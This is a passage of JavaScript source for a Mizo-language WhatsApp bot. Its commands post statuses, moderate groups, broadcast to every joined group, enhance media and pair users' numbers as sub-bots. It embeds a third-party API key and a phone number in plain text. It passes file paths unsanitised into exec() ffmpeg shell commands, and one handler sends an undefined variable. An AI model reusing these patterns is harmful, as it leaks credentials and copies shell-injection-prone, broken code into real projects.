await dodoi(`A in upload zo a✓... i check thei ang`)
} else {
dodoi('Video reply rawh')
}
}
break
case 'statusimage':
case 'upswimage': {

 if (!HerbertTheCreator) return dodoi(mess.owner)
if (/image/.test(mime)) {
var StatusImg = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
await HBWABotMz.sendMessage('status@broadcast', {
   image: {
url: StatusImg
   },
   caption: q ? q : ''
}, { statusJidList: Object.keys(global.db.users)})
await dodoi(`A in upload zo a✓... i check thei ang`)
} else {
dodoi('Thlalak reply rawh')
}
}
break

break
case 'statusaudio':
case 'upswaudio': {
  if (!HerbertTheCreator) return dodoi(mess.owner)
if (/audio/.test(mime)) {
var StatusAud = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
await HBWABotMz.sendMessage('status@broadcast', {
   audio: {
url: StatusAud
   },
   mimetype: 'audio/mp4',
   ptt: true
}, {
   backgroundColor: '#000000',
   statusJidList: Object.keys(global.db.users)
})
await dodoi(`A in upload zo a✓... i check thei ang`)
 } else {
dodoi('Audio reply rawh!')
 }
}
break
case 'join': {

if (!HerbertTheCreator && !HerbertTheCreator1) return dodoi(mess.owner)
if (!text) return dodoi(`Tiang hian tih tur: ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return dodoi('Link a dik lo!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await HBWABotMz.groupAcceptInvite(result)
await dodoi(`Ka join tawh e....✓`)
}
break
case 'block': case 'ban': {

if (!m.isGroup) return dodoi(mess.group)
if (!HerbertTheCreator && !HerbertTheCreator1) return dodoi(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotMz.updateBlockStatus(users, 'block')
await dodoi(`Block a ni e....✓`)
}
break
case 'unblock': {

if (!m.isGroup) return dodoi(mess.group)
if (!HerbertTheCreator && !HerbertTheCreator1) return dodoi(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotMz.updateBlockStatus(users, 'unblock')
await dodoi(`Zove....✓`)
}
break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {

const lisben = "Total Block: " + banUser.length
dodoi(lisben)
}
break
case 'delete': case 'del': {
if (!m.quoted) return dodoi('Message delete tur a awm chuan delete tiin reply rawh')
let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 HBWABotMz.sendMessage(m.chat, { delete: key })
}
break


case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {

if (!m.isGroup) return dodoi(mess.group)
if (!isBotAdmins) return dodoi(mess.botAdmin)
let response = await HBWABotMz.groupInviteCode(m.chat)
HBWABotMz.sendText(m.chat, `*${groupMetadata.subject}*\n\nGroup Link : https://chat.whatsapp.com/${response}\nGroup ID : ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${groupMetadata.id}`, m, { detectLink: true })
}
break
case 'gpid':{
if (!m.isGroup) return dodoi(mess.group)
if (!isBotAdmins) return dodoi(mess.botAdmin)
await HBWABotMz.sendText(from, `*${groupMetadata.subject}*\n\n*Group ID:* ${groupMetadata.id}`, m, { detectLink: true })
}
break

case 'add': {
if (!m.isGroup) return dodoi(mess.group)
if (!isBotAdmins) return dodoi(mess.botAdmin)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);
if (!text && !m.quoted) {
dodoi(`Mi dang add i duh chuan an number rawn dah rawh
*Entirnan:* ${prefix + command} ${owner}`)
} else {
const numberdikem = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
	try {
	await HBWABotMz.groupParticipantsUpdate(m.chat, [numberdikem], 'add').then(async (res) =>{
	for (let i of res) {
		let invv = await HBWABotMz.groupInviteCode(m.chat)
		if (i.status == 408) return dodoi('He user hi a left na a la rei loh avangin add theih a ni lo!')
		if (i.status == 401) return dodoi('He user huan bot a block avangin add thei a ni lo!')
		if (i.status == 409) return dodoi('He user hian a rawn join tawh!')
		if (i.status == 500) return dodoi('Group a full add theih a ni lo!')
		if (i.status == 403) {
			await HBWABotMz.sendMessage(m.chat, { text: `@${numberdikem.split('@')[0]} Hi add thei a ni lo a, chu vangin private chat ah invite link thawn a ni!`, mentions: [numberdikem] }, { quoted : m })
			await HBWABotMz.sendMessage(`${numberdikem ? numberdikem : '918416093656@s.whatsapp.net'}`, { text: `${'https://chat.whatsapp.com/' + invv}\n\nAdmin: wa.me/${m.sender}\nInvite you to this group\nI duh chuan lo join rawh`, detectLink: true, mentions: [numberdikem] }, { quoted : floc2 }).catch((err) => dodoi('Invite na thawn thei a ni hrih lo!'))
		} else {
			dodoi('Zove✓')
		}
	}
})
} catch (e) {
  dodoi('He user hi add thei a ni lo')
			}
	}
}
break
case 'kick': {

if (!m.isGroup) return dodoi(mess.group)
if (!isAdmins) return dodoi(mess.admin)
if (!isBotAdmins) return dodoi(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotMz.groupParticipantsUpdate(m.chat, [users], 'remove')
await dodoi(`He group a tang hian remove a ni....✓`)
}
break
case 'promote': {

if (!m.isGroup) return dodoi(mess.group)
if (!isBotAdmins) return dodoi(mess.botAdmin)
if (!isAdmins && !HerbertTheCreator1) return dodoi(mess.admin)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotMz.groupParticipantsUpdate(m.chat, [users], 'promote')
await dodoi(`Zove....✓`)
}
break
case 'demote': {

if (!m.isGroup) return dodoi(mess.group)
if (!isBotAdmins) return dodoi(mess.botAdmin)
if (!isAdmins && !HerbertTheCreator1) return dodoi(mess.admin)
if (!isBotAdmins) return dodoi(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotMz.groupParticipantsUpdate(m.chat, [users], 'demote')
await dodoi(`Zove....✓`)
}
break
case 'hidetag': {

if (!m.isGroup) return dodoi(mess.group)
if (!isAdmins && !HerbertTheCreator1) return dodoi(mess.admin)
if (!isBotAdmins) return dodoi(mess.botAdmin)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
const me = m.sender;
let ahming = `*From : @${me.split("@")}*\n*Message :*\n${text}`
let siamthat = ahming.replace(',s.whatsapp.net','')
HBWABotMz.sendMessage(m.chat, { text : siamthat, mentions: participants.map(a => a.id)}, { quoted: m })
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break
case 'totag': {

if (!m.isGroup) return dodoi(mess.group)
if (!isAdmins && !HerbertTheCreator1) return dodoi(mess.admin)
if (!isBotAdmins) return dodoi(mess.botAdmin)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
if (!m.quoted) return dodoi(`Media reply rawh *${prefix + command}* tiin`)
HBWABotMz.sendMessage(m.chat, {
    forward: m.quoted.fakeObj,
    mentions: participants.map(a => a.id)
})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break

case 'bcgc': case 'bcgroup': {

if (!HerbertTheCreator && !HerbertTheCreator1) return
if (!text) return
let getGroups = await HBWABotMz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
dodoi(`Broadcast message chu ${anu.length * 1.5} seconds chhungin Group Chat ${anu.length} ah thawn mek anni`)
for (let i of anu) {
    await sleep(1500)
    let a = `Broadcast by ${pushname} \n\nMessage: ${text}\n` 
    HBWABotMz.sendMessage(i, {text: a })
}
dodoi(`Broadcast message chu group ${anu.length} ah thawn fel a ni tawh e`)
    }
break
    
case 'ebinary': {

if (!q) return dodoi(`Message reply in emaw command zoah rawn dah la Binary code ah a lo chang ang tiang hian hman tur: ${prefix + command} hello world`)
await loadingreact()
let { eBinary } = require('./asset/zepzeuh/binary')
let eb = await eBinary(`${q}`)
var ebinaryloading = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hei le : \n${eb}`]

let { key } = await HBWABotMz.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < ebinaryloading.length; i++) {await HBWABotMz.sendMessage(from, {text: ebinaryloading[i], edit: key },{quoted:m})}
}
break
case 'dbinary': {

if (!q) return dodoi(`Binary code decode i duh chuan tian hian hman tur: ${prefix + command} 1101000 1100101 1101100 1101100 1101111`)
await loadingreact()
let { dBinary } = require('./asset/zepzeuh/binary')
let db = await dBinary(`${q}`)
var dbinaryloading = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hei le: \n${db}`]

let { key } = await HBWABotMz.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < dbinaryloading.length; i++) {await HBWABotMz.sendMessage(from, {text: dbinaryloading[i], edit: key },{quoted:m})}
}
break
case 'remini': case 'hd': {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
    /*
    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    }
    */
    let quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || m.quoted).mimetype || '';
    const qmsg = (quoted.msg || m.quoted);

    if (!quoted) return dodoi(`Thlalak/Video rawn dah rawh`);

    const isImage = /image/.test(mime);
    const isVideo = /video/.test(mime);

    if (!isImage && !isVideo) return dodoi(`Thlalak/Video Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`);

    await loadingreact();

    if (isImage) {
        // Image Enhancement using primary API, fallback to local lib
        let media = await quoted.download();
        let enhanced;

        try {
            const response = await fetch("https://lexica.qewertyy.dev/upscale", {
      body: JSON.stringify({
        image_data: Buffer.from(imageBuffer, "base64"),
        format: "binary",
      }),
      headers: {
        "Content-Type": "application/json",
      },
      method: "POST",
    });

            if (!response.ok) throw new Error("Primary Remini API failed");

            enhanced = Buffer.from(await response.arrayBuffer());
        } catch (error) {
            console.log("Primary Remini API failed, using fallback:", error.message);
            const { remini } = require('./lib/remini');
            enhanced = await remini(media, "enhance");
        }

        await HBWABotMz.sendMessage(m.chat, { image: enhanced, caption: `\n*©${global.botname}*` }, { quoted: m });
        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await eco.give(limitneihtu, kantitle, hmanzat2);
        await eco.deduct(limitneihtu, freevip, 1);

    } else if (isVideo) {
        // Video Enhancement using remini2
        const fs = require('fs');
        const { exec } = require('child_process');
        const { tmpdir } = require('os');
        const path = require('path');
        const { remini2 } = require('./lib/remini2');

        let fps = parseInt(text) || 30;
        if ((quoted ? quoted.seconds : m.msg.seconds) > 30) return dodoi(`Video second 30 aia tam remini thei a ni lo`);
        if (fps > 100) return dodoi(`Video FPS hi 100 aia tam process thei a ni lo!`);

        await HBWABotMz.sendMessage(m.chat, {
            text: 'Video tihfiah chhung hi minute 5-15 vel ngah a ngai ang!..'
        }, { quoted: m });

        const timestamp = Date.now();
        const tempDir = path.join(tmpdir(), `video_remini_${timestamp}`);
        const framesDir = path.join(tempDir, 'frames');
        const enhancedFramesDir = path.join(tempDir, 'enhanced_frames');
        const outputVideo = path.join(tempDir, `enhanced_video.mp4`);

        [tempDir, framesDir, enhancedFramesDir].forEach(dir => {
            if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        });

        let mediaPath = await HBWABotMz.downloadAndSaveMediaMessage(qmsg, path.join(tempDir, 'input.mp4'));

        await new Promise((resolve, reject) => {
            exec(`ffmpeg -i ${mediaPath} -vf "fps=${fps}" ${framesDir}/frame-%04d.png`, (err) => {
                if (err) reject(err);
                else resolve();
            });
        });

        let images = fs.readdirSync(framesDir);
        let enhancedFrames = [];

        for (let img of images) {
            let imgPath = path.join(framesDir, img);
            let enhancedImg = await remini2(fs.readFileSync(imgPath), "enhance");
            fs.writeFileSync(path.join(enhancedFramesDir, img), enhancedImg);
            enhancedFrames.push(img);
        }

        await new Promise((resolve, reject) => {
            exec(`ffmpeg -framerate ${fps} -i ${enhancedFramesDir}/frame-%04d.png -i ${mediaPath} -c:v libx264 -pix_fmt yuv420p -c:a aac -strict experimental -shortest ${outputVideo}`, (err) => {
                if (err) reject(err);
                else resolve();
            });
        });

        let finalVideo = fs.readFileSync(outputVideo);

        await HBWABotMz.sendMessage(m.chat, { video: finalVideo, caption: `\n*©${global.botname}*` }, { quoted: m });
        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await eco.give(limitneihtu, kantitle, hmanzat2);
        await eco.deduct(limitneihtu, freevip, 1);

        fs.rmSync(tempDir, { recursive: true, force: true });
    }

    await finishreact();
}
break;


case 'tobebot': {
    const freevip = "frvip2";
    HBWABotMz.sendMessage(from, { react: { text: "♻️", key: m.key }})
    if (isBot) return dodoi("Bot connect laiin tobebot hman thei a ni lo")
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    const amah = m.sender
    const folderPath = `./asset/tobebot/${amah}`;
    if (m.isGroup) return dodoi(mess.private)
    let wanb = `+`+amah.split("|")[0].replace(/[^0-9]/g, '')
    let wanbck = await HBWABotMz.onWhatsApp(wanb)
    if (wanbck.length == 0) { 
    dodoi(`I WhatsApp number hi a support lo!!`)
    return;
    }
    if (fs.existsSync(folderPath)) {
    HBWABotMz.sendMessage(from, { react: { text: "🤖", key: m.key }})
    await dodoi('> Message From Tobebot\nMinute 2 a la zo lo niin a lang.. minute 2 ral hunah connect theih a nih thu message in ka rawn thawn ang che...')
    } else {
        await tobebot(HBWABotMz, m, from, wanb)
        await sleep(4000)
    const cu = fs.readFileSync('./asset/trash/pairing.json', 'utf-8');
const cuObj = JSON.parse(cu);
 if (isBusiness) {
 HBWABotMz.sendMessage(m.chat, { text: `> Message From tobebot\n
Code: *${cuObj.code}* *He code hmang hian bot i ni thei*
1. On your WhatsApp home page, click on the three dots in the top right corner.
2. Tap *Link Device*
3. Tap *Link a devics*
4. Just below there will be a *Link with phone number instead*, tap on it
5. Paste your 8 character code.`}, { quoted: m });
dodoi(cuObj.code)
await finishreact();
 return
}
dodoi(cuObj.code)
await HBWABotMz.relayMessage(from, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: {text: `> Message From tobebot\n
Code: *${cuObj.code}* *He code hmang hian bot i ni thei*
1. On your WhatsApp home page, click on the three dots in the top right corner.
2. Tap *Link Device*
3. Tap *Link a devics*
4. Just below there will be a *Link with phone number instead*, tap on it
5. Paste your 8 character code.`},
header: {},
nativeFlowMessage: {
buttons: [{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "COPY",
url: `https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp${cuObj.code}`,
copy_code: cuObj.code,
})},
]}}}}}, {quoted : m});
    HBWABotMz.sendMessage(from, { react: { text: "✅", key: m.key }})
    await eco.deduct(limitneihtu, freevip, 5);
}
}
break
case 'magicpick': {
  const userId = m.sender.split('@')[0];
  if (magicdb.active[userId]) {
    return dodoi('Game hi a la active avangin i zawh hma chuan i hmang chhunzawm thei dawn lo');
  }
  const correctBox = Math.floor(Math.random() * 3) + 1;
  magicdb.active[userId] = {
    box: correctBox,
    step: 'box'
  };
  saveDb();
  return HBWABotMz.sendMessage(m.chat, {
    text: `*Pick a box! 🧙‍♂️*\n\n📦 📦 📦\n 1    2    3\n\n_Reply with a number (1 to 3) to open one_`
  }, { quoted: m });
}
break;
case `${prefix}junkclean`: {
    if (!HerbertTheCreator2) return dodoi(mess.owner);
    const folderPath2 = `./session`;
    if (fs.existsSync(folderPath2)) {
        await deleteFilesExcept(folderPath2, 'creds.json');
        await dodoi(`File tangkai lo te delete fel a ni e✓✓`);
    } else {
        await dodoi(`Junk files hmuh tur a la awm lo`);
    }
}
break;

case 'reset1': 
    if (text == 'tobebot') {
    if (isBot) return dodoi("Bot connect laiin kan reset thei lo, chu vangin reset i duh chuan i link device a mi te kha logout phawt rawh")
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    const amah = m.sender;
    const folderPath = `./asset/tobebot/${amah}`;
  /*  if (fs.existsSync(folderPath)) {
        fs.rmSync(folderPath, { recursive: true, force: true });  // Delete the folder and its contents
        HBWABotMz.sendMessage(from, { react: { text: "🗑️", key: m.key }});
        await dodoi(`I tobebot chu reset fel a ni tawh e, tun atangin i hmang chhun zawm leh thei tawh ang`);
    } else {
        await dodoi('Engmah record a awm rih loh avngin reset angai lo');
    }
    */
    const deleteUserSession = (folderPath) => {
        if (fs.existsSync(folderPath)) {
            fs.readdirSync(folderPath).forEach(file => {
                const curPath = path.join(folderPath, file);
                fs.lstatSync(curPath).isDirectory() ? deleteUserSession(curPath) : fs.unlinkSync(curPath);
            });
            fs.rmdirSync(folderPath);
            console.log(chalk.green(`${amah} : tobebot chu reset fel a ni tawh e, tun atangin i hmang chhun zawm leh thei tawh ang`));
        } else {
            console.log(chalk.green(`${amah}Engmah record a awm rih loh avngin reset angai lo`));
        }
    };
    
    try {
        deleteUserSession(folderPath);
       HBWABotMz.sendMessage(from, { react: { text: "🗑️", key: m.key }});
        await dodoi(`I tobebot chu reset fel a ni tawh e, tun atangin i hmang chhun zawm leh thei tawh ang`);
    } catch (err) {
        console.error(chalk.red(`Error while deleting session for user: ${userToDelete}`), err);
        await dodoi('Engmah record a awm rih loh avngin reset angai lo');
    }
}
break;

case 'list':
if (text == 'tobebot') {
try {
let user = [... new Set([...global.conns.filter(HBWABotMz => HBWABotMz.user).map(HBWABotMz => HBWABotMz.user)])]
te = "*List To Be Bot*\n\n"
for (let i of user){
y = await HBWABotMz.decodeJid(i.id)
te += " 😇 A hming : " + i.name + "\n"
te += " 👑 Contact : @" + y.split("@")[0] + "\n\n"
}
HBWABotMz.sendMessage(from,{text:te,mentions: await HBWABotMz.parseMention(te), },{quoted:m})
} catch (err) {
dodoi(`Connect an awm lo lai tak a ni!...`)
}
return
}
break

  
case 'how':{
 var howtobebotvid = await getBuffer(`${howtobebot4}`)
if (text == 'tobebot') return await HBWABotMz.sendMessage(from, { video: howtobebotvid, caption: `Vip members tan bot nih thei dan awlsam deuh` }, {quoted:m})
}
break

case 'self': {

if (!HerbertTheCreator) return dodoi(mess.owner)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.public = false
dodoi('*Mahni chauha hman thei turin thlak a ni✓*')
}
break
case 'public': {

if (!HerbertTheCreator) return dodoi(mess.owner)
HBWABotMz.public = true
dodoi('*Mi zawng zawng hman thei turin thlak a ni✓*')
}
break

case 'tocartoon': {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    if (!quoted) return dodoi(`Thlalak rawn dah rawh`);
    if (!/image/.test(mime)) return dodoi(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`);
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await loadingreact();
    let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
    let anu = await tourlup(media);   
    // Fetch JSON from the API
    let toanime2;
    try {
        toanime2 = await fetchJson(`https://api.betabotz.eu.org/api/maker/jadianime3d?url=${encodeURIComponent(anu)}&apikey=Btz-HlFgj`);
    } catch (error) {
        console.error("Error fetching JSON from the API:", error);
        return dodoi("API key a zo a, khawngaihin owner bulah renew turin va dil rawh");
    }
    
    // Ensure result and fileUrl exist
    if (toanime2 && toanime2.result && toanime2.result.output && toanime2.result.output.fileUrl) {
        let fileUrl = toanime2.result.output.fileUrl;
        
        // Send the message with the extracted fileUrl
        HBWABotMz.sendMessage(m.chat, { image: { url: `${fileUrl}` }, caption: `\n*©${global.botname}*` }, { quoted: m });
        await eco.deduct(limitneihtu, freevip, 1);
        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await finishreact();
    } else {
        console.error("Unexpected JSON structure or missing fileUrl:", toanime2);
        return dodoi("Tuna mi hi a genarate thei lova, thlalak dang han try leh teh!!");
    }
}
break;

case 'remini2': {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    if (!quoted) return dodoi(`Thlalak rawn dah rawh`);
    if (!/image/.test(mime)) return dodoi(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`);
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await loadingreact();
    let media = await HBWABotMz.downloadAndSaveMediaMessage(quoted)
    let anu = await tourlup(media);   
    let remini2;
    try {
        remini2 = await fetchJson(`https://api.betabotz.eu.org/api/tools/remini?url=${encodeURIComponent(anu)}&apikey=Btz-HlFgj`);
    } catch (error) {
        console.error("Error fetching JSON from the API:", error);
        return dodoi("API key a zo a, khawngaihin owner bulah renew turin va dil rawh");
    }
        let fileUrl = remini2.url;
        HBWABotMz.sendMessage(m.chat, { image: { url: `${fileUrl}` }, caption: `\n*©${global.botname}*` }, { quoted: m });
        await eco.deduct(limitneihtu, freevip, 1);
        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await finishreact();
}
break;

case `/donation` : case 'donate': {
const tAndS = await eco.balance(limitneihtu, privacy11);
    let donation = await fetchJson(`https://raw.githubusercontent.com/HBMods-OFC/Vawk/refs/heads/master/donation.json`);
    let fileUrl = donation.url;
    HBWABotMz.sendMessage(m.chat, { image: { url: fileUrl }, caption: `*Buy Me Coffee*` }, { quoted: m });
}
break;

case 'tozombie': {
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
if (!quoted) return dodoi(`Thlalak rawn dah rawh`)
if (!/image/.test(mime)) return dodoi(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
